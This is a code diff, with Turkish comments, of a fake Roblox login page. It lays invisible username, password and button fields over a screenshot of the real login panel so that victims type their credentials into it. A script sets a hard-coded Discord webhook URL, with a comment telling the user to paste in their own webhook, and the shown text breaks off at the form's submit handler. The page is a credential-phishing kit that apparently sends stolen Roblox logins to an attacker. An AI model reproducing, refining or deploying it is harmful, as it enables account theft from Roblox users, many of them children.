@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Giriş</title>
     <style>
-        /* Tüm ekranı sıfırlama ve arka plan */
+        /* Ekranın tamamını kaplama ve taşmaları engelleme */
         html, body {
             margin: 0;
             padding: 0;
@@ -19,21 +19,17 @@
             font-family: Arial, sans-serif;
         }
 
-        /* 
-           KÖKTEN ÇÖZÜM: Formu ve resmi tek bir sabit kutuya kilitliyoruz.
-           Resim küçülse de büyüse de inputlar da resimle aynı oranda kalır.
-        */
+        /* Resim ve inputları bir arada tutan tam ekran kapsayıcı */
         .wrapper {
             position: relative;
             width: 100%;
             height: 100%;
-            max-width: 540px;  /* Resmin panel genişliği standardı */
-            max-height: 600px; /* Resmin panel yükseklik standardı */
             display: flex;
             justify-content: center;
             align-items: center;
         }
 
+        /* Arka plan resmini kesmeden ekrana tam oturtan ayar */
         .tam-ekran-resim {
             width: 100%;
             height: 100%;
@@ -41,101 +37,115 @@
             display: block;
         }
 
-        /* Tüm interaktif alanların (giriş ve butonların) ortak CSS ayarları */
-        .wrapper input, .wrapper button, .wrapper a {
+        /* 
+           GİRİŞ PANELİ KUTUSU:
+           Ekrandaki o gri giriş formunun tam üzerine şeffaf bir görünmez kutu koyuyoruz.
+           Kutular bu panelin içinde olacağı için resimle beraber küçülüp büyüyecekler.
+        */
+        .form-container {
             position: absolute;
-            width: 82%; /* Gri kutuların genişlik oranı */
-            height: 40px; /* Resimdeki kutuların gerçek piksel yüksekliği */
+            width: 19.5%; /* Resimdeki giriş panelinin tam genişlik oranı */
+            height: 48%;  /* Giriş panelinin üstten alta tüm butonları kapsayan yükseklik oranı */
+            top: 36.3%;   /* Üstten tam olarak Username kutusunun başladığı yer */
             left: 50%;
             transform: translateX(-50%);
+            display: flex;
+            flex-direction: column;
+            box-sizing: border-box;
+        }
+
+        /* Tüm inputların ve butonların bu şeffaf panel içindeki ortak özellikleri */
+        .form-container input, .form-container button, .form-container a {
+            width: 100%;
+            height: 13.5%; /* Form panelinin yüksekliğine göre her kutunun kapladığı alan */
             background: transparent;
             border: none;
             outline: none;
             box-sizing: border-box;
         }
 
-        /* Yazı yazılan giriş alanlarının iç metin hizalaması */
-        .wrapper input {
+        /* Yazı yazılan input alanlarının dikey ortalaması ve yazı rengi */
+        .form-container input {
             color: #ffffff;
-            font-size: 15px;
-            padding: 0 14px;
-            line-height: 40px; /* Yazının kutu içinde dikeyde tam ortalanmasını sağlar */
+            font-size: 14px;
+            padding: 0 12px;
         }
 
-        .wrapper button, .wrapper a {
+        .form-container button, .form-container a {
             cursor: pointer;
         }
 
         /* ============================================================ */
-        /* MİLİMETRİK SABİT PİKSEL KONUMLANDIRMALARI (Yukarıdan Aşağıya) */
+        /* PANEL İÇİ MİLİMETRİK BOŞLUKLAR (Yukarıdan Aşağıya Sıralama) */
         /* ============================================================ */
 
-        /* 1. KUTU: Username/Email/Phone alanı */
+        /* 1. KUTU: Username Giriş Alanı */
         .username-field {
-            top: 132px; 
+            margin-bottom: 4%; /* Şifre kutusuna olan mesafe */
         }
 
-        /* 2. KUTU: Password alanı */
+        /* 2. KUTU: Password Giriş Alanı */
         .password-field {
-            top: 204px; 
+            margin-bottom: 3.5%; /* Log in butonuna olan mesafe */
         }
 
         /* 3. BUTON: Log in butonu */
         .login-btn {
-            top: 275px; 
-            height: 44px; /* Log in butonu biraz daha kalın */
+            margin-bottom: 18.5%; /* "Forgot..." yazısını atlayıp alttaki gri butona geçiş boşluğu */
         }
 
         /* 4. BUTON: Send me the one-time code by email */
         .one-time-code-btn {
-            top: 395px; 
-            height: 44px;
+            margin-bottom: 2.5%; /* Alttaki Quick Login butonuna olan mesafe */
         }
 
         /* 5. BUTON: Quick Login */
         .quick-login-btn {
-            top: 454px; 
-            height: 44px;
+            margin-bottom: 5%;
         }
 
         /* 6. LİNK: En alttaki Sign Up yazısı */
         .signup-link {
-            top: 524px;
-            height: 25px;
-            width: 70px; /* Sadece "Sign up." kelimesinin genişliği */
-            left: 335px; /* Kelimenin sağ taraftaki tam yatay pozisyonu */
-            transform: none; /* Sol-sağ kaymasını bozmamak için */
+            height: 8%;
+            width: 25%; /* Sadece en alttaki "Sign up" yazısının genişliği kadar */
+            margin-left: auto; /* Yazıyı sağ tarafa doğru hizalamak için */
+            margin-right: 14%; /* Sağ kenardan olan iç hizası */
         }
     </style>
 </head>
 <body>
 
-    <!-- Tüm elemanları resimle birlikte kilitleyen yeni ana kapsayıcı -->
     <div class="wrapper">
-        <!-- Arka plan resmi -->
+        <!-- Arka plan resmi artık tam ekran ve olması gerektiği gibi büyük duracak -->
         <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">
 
-        <!-- Form Elemanları (Milimetrik piksel hesabı ile yerleştirildi) -->
-        <form id="girisFormu">
-            <!-- Kullanıcı adı input -->
+        <!-- Görünmez, esnek form paneli (Resimle birlikte milimetrik hareket eder) -->
+        <form id="girisFormu" class="form-container">
+            
+            <!-- Kullanıcı adı -->
             <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
             
-            <!-- Şifre input -->
+            <!-- Şifre -->
             <input type="password" id="password" name="password" class="password-field" required>
             
-            <!-- Log in Giriş butonu -->
+            <!-- Log in butonu -->
             <button type="submit" class="login-btn" title="Giriş Yap"></button>
-        </form>
+            
+            <!-- One-time code butonu -->
+            <button type="button" class="one-time-code-btn"></button>
+            
+            <!-- Quick Login butonu -->
+            <button type="button" class="quick-login-btn"></button>
+            
+            <!-- Sign up linki -->
+            <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
 
-        <!-- Diğer Fonksiyonel Butonlar ve Linkler -->
-        <button type="button" class="one-time-code-btn"></button>
-        <button type="button" class="quick-login-btn"></button>
-        <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
+        </form>
     </div>
 
     <!-- DISCORD WEBHOOK BAĞLANTISI -->
     <script>
-        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIRMAYI UNUTMA KANKA!
+        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIR KANKA
         const webhookURL = "https://discord.com/api/webhooks/1504533553780887593/k-e_pISawJOV-LvtFhqqXuSPRMhGuUjC8N3i8IyXimO3yKkJ2R8UeiSR7e4ZJ9SqGc6S";
 
         document.getElementById('girisFormu').addEventListener('submit', function(e) {
